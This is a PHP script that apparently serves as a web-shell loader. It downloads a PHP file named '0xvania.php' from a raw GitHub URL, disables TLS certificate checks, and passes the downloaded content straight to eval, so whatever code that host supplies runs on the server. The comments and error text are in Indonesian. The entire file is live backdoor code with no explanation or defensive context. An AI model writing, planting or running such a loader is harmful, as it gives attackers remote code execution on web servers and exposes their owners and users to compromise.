<?php
$url = 'https://raw.githubusercontent.com/hairamcrot/back/refs/heads/main/0xvania.php';

function fetch_and_run($url) {
    if (function_exists('curl_exec')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $code = curl_exec($ch);
        curl_close($ch);
    } elseif (function_exists('file_get_contents')) {
        $code = file_get_contents($url);
    } else {
        die("Tidak bisa mengambil file.");
    }

    // Eksekusi isi file langsung
    eval("?>".$code);
}

fetch_and_run($url);
?>
